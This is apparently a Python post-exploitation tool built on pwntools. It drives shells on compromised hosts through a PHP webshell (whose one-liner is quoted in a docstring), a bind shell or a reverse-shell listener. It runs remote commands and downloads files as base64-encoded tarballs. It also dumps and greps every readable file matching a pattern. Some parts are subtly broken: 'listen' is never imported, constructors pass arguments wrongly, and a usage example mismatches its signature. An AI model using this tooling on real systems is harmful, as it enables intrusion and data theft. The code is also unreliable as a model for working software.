import os
import sys
import binascii
import shlex
import requests
from base64 import b64decode
from datetime import datetime
from pwnlib import term
from pwnlib.tubes import tube, remote
from pwnlib.log import getLogger


log = getLogger(__name__)


class _OnTubeExecutor(object):

    def __init__(self, tube):
        self.tube = tube
        self.timeout = 0.05

    def __call__(self, cmd):
        self.tube.sendline(cmd)
        response = []
        while self.tube.can_recv(timeout=self.timeout):
            cur = self.tube.recv(timeout=self.timeout)
            cur = cur.replace('\r\n', '\n')
            response.append(cur)
        return "".join(response)


class ShellSim(object):

    def __init__(self, how, pre=None, post=None, onlyascii=True,
            download_dir="./downloads/"):
        self.onlyascii = onlyascii
        self.download_dir = download_dir
        self.tube = None
        if isinstance(how, tube.tube):
            self.tube = how
            self.real_execute = _OnTubeExecutor(how)
            pass
        elif callable(how):
            self.real_execute = how
        else:
            def bail_out(**args):
                raise ValueError("Tried to call uncallable ShellSim parameter how")
            self.real_execute = bail_out

        if pre is not None:
            self.pre = pre
        else:
            self.pre = lambda x: x
        if post is not None:
            self.post = post
        else:
            self.post = lambda x: x
        self.onclose = None

        self._handlers = {':download': self.download,
                          # ':upload': self.upload,
                          ':printlike': self.print_all_files_like,
                          'exit': self.close,
                          ':exit': self.close,
                          'cd': self.cd,
                          'pwd': self.pwd}
        self._cwd = ''
        self._user = ''
        self._host = ''
        self.prompt = term.text.bold_blue('{user}') \
                + '@{host} ' + term.text.bold("{cwd}") + ' > '
        self.__marker = None

    def execute(self, cmd):
        if self._cwd:
            cd_cmd = "cd '{}' && {}".format(self._cwd, cmd)
        else:
            cd_cmd = cmd
        return self.post(self.real_execute(self.pre(cd_cmd)))

    def _get_prompt(self):
        return self.prompt.format(user=self._user, host=self._host, cwd=self._cwd)

    def get_remote_info(self):
        marker = '---next---'
        cmds = ['whoami', 'pwd', 'hostname']
        x = ";echo \"{}\";".format(marker).join(cmds)
        res = self.execute(x)
        if not res:
            log.warn("get remote info failed")
            return
        self._user, self._cwd, self._host = map(lambda s: s.strip(),
                                                res.split(marker))

    def command(self, cmd):
        if isinstance(cmd, str):
            cmd = shlex.split(cmd)
        try:
            if cmd[0] in self._handlers:
                return self._handlers[cmd[0]](*cmd[1:])
            else:
                return self.execute(" ".join(cmd))
        except Exception as e:
            log.warn("Got exception during processing of command: {}\n{}"
                     .format(cmd, e))
            return ""

    e = command

    def interactive(self):
        self.get_remote_info()
        go = True
        try:
            while go:
                if term.term_mode:
                    data = term.readline.readline(prompt = self._get_prompt(), float = True)
                else:
                    data = sys.stdin.readline()

                if data:
                    if not data.strip():
                        continue

                    try:
                        res = self.command(data)
                        sys.stdout.write(res)
                        if not res or res[-1] != "\n":
                            sys.stdout.write("\n")
                        sys.stdout.flush()
                    except EOFError:
                        go = False
                        log.info('Got EOF while sending in interactive')
                else:
                    go = False
        except KeyboardInterrupt:
            log.warn('Interrupted')

    def download(self, path):
        """
        Download a directory or file as a .tar.gz to self.downloads_dir, which
        defaults to './downloads/'.
        """
        cmd = "tar cz '{}' 2>/dev/null"
        if self.onlyascii:
            cmd = "tar cz '{}' 2>/dev/null|base64"
        abspath = path
        if not path.startswith("/") and self._cwd:
            abspath = os.path.abspath(self._cwd + "/" + path)
        res = self.execute(cmd.format(abspath))
        if self.onlyascii:
            res = res.replace("\n", "").strip()
            res = b64decode(res)
        now = (datetime.now().isoformat().split("."))[0]
        tarname = path.replace("/", "_").replace(".", "_") \
                  + "-" + now + ".tar.gz"
        if not os.path.exists(self.download_dir):
            os.mkdir(self.download_dir)
        fname = os.path.join(self.download_dir, tarname)
        fname = os.path.abspath(fname)
        # log.debug(str(res))
        # log.debug(type(res))
        with open(fname, "wb") as f:
            f.write(bytes(res))
        return "Written contents of {} file to {}".format(abspath, fname)

    def upload(self, path):
        raise NotImplementedError()
        # TODO: "upload" a file. maybe use base64 or just cat the lines into
        # the file one by one or something...

        # if not os.path.exists(path):
        #     self.error("cannot upload '{}' because it does not exit!"
        #                .format(path))
        # else:
        #     with open('path', 'rb') as f:
        #         content = f.read()
        return ""

    def cd(self, dir='~'):
        assert dir
        if dir[0] != "/" and dir[0] != "~" and self._cwd:
            self._cwd = os.path.abspath(self._cwd + "/" + dir)
        else:
            self._cwd = dir
        return ""

    def pwd(self):
        return self._cwd

    def close(self):
        if self.tube:
            self.execute("exit")
            self.tube.close()
        if self.onclose:
            self.onclose()

    def read_all_files_like(self, regex, indir='.'):
        if not self.__marker:
            self.__marker = "-_- o_O {} O_o -_-"\
                    .format(binascii.hexlify(os.urandom(10)))
        marker = self.__marker
        printf = marker + "\\n%p\\n" + marker
        cmdtpl = "find '{}' -regex '{}' -readable -type f -printf '{}'" + \
                 " -exec cat '{{}}' \; 2>/dev/null"
        cmd = cmdtpl.format(indir, regex, printf)
        res = self.execute(cmd)
        splitted = res.split(marker)[1:]
        i = iter(splitted)
        return {k.strip(): v for k, v in zip(i, i)}

    def print_all_files_like(self, regex, indir='.'):
        printf = "---- %p ----\\n"
        cmdtpl = "find '{}' -regex '{}' -readable -type f -printf '{}'" + \
                " -exec cat '{{}}' \; 2>/dev/null"
        cmd = cmdtpl.format(indir, regex, printf)
        res = self.execute(cmd)
        # sys.stdout.write(res)
        # sys.stdout.flush()
        return res

    def grep_for(self, regex, indir='.', i=False):
        grep_opts = ["-r"]
        if i:
            grep_opts.append("-i")
        grepcmd = "grep {} '{}' {}".format(" ".join(grep_opts), regex, indir)
        return self.execute(grepcmd)


class WebShellClient(ShellSim):
    """
    This assumes a webshell endpoint, that just spits out the result of the
    command. i.e. something like

        <?php echo system($_GET['cmd']) ?>

    You can then do something like this:

        >>> ws = WebShellClient('http://vuln.example.com/sh.php', "cmd")
        >>> print ws.command("ls")
        sh.php vuln.php
        >>> ws.interactive()

    To get a rather nice looking shell.
    """

    def __init__(self, url, param=None, data={}, method='GET',
                 download_dir="./downloads/"):
        ShellSim.__init__(self, None, onlyascii=True,
                          download_dir=download_dir)
        self.url = url
        self.param = param
        self.method = method
        self.req_data = data
        self._session = requests.session()

    def execute(self, cmd):
        if self._cwd:
            cd_cmd = "cd '{}' && {}".format(self._cwd, cmd)
        else:
            cd_cmd = "{}".format(cmd)

        if self.pre:
            cd_cmd = self.pre(cd_cmd)
        data = self.req_data.copy()
        data[self.param] = cd_cmd
        if self.method.lower() == 'get':
            res = self._session.get(self.url, params=data)
        elif self.method.lower() == 'post':
            res = self._session.post(self.url, data=data)

        s = res.text
        if self.post:
            s = self.post(s)
        return s


class RemoteShellClient(ShellSim):
    """
    Usage:

        rs = RemoteShellClient('vuln.example.com', 1234)
        rs.interactive()

    """

    def __init__(self, host, port, download_dir="./downloads/"):
        super(RemoteShellClient, self).__init__(self,
                                                 None,
                                                 onlyascii=False,
                                                 download_dir=download_dir)
        self.tube = remote(host, port)
        self.real_execute = _OnTubeExecutor(self.tube)


class ReverseShellClient(ShellSim):
    """
    Usage:

        rs = ReverseShellClient('vuln.example.com', 1234)
        rs.interactive()

    """

    def __init__(self, port, host='0.0.0.0', download_dir="./downloads/"):
        super(ReverseShellClient, self).__init__(self,
                                                 None,
                                                 onlyascii=False,
                                                 download_dir=download_dir)
        self.tube = listen(host, port)
        self.real_execute = _OnTubeExecutor(self.tube)
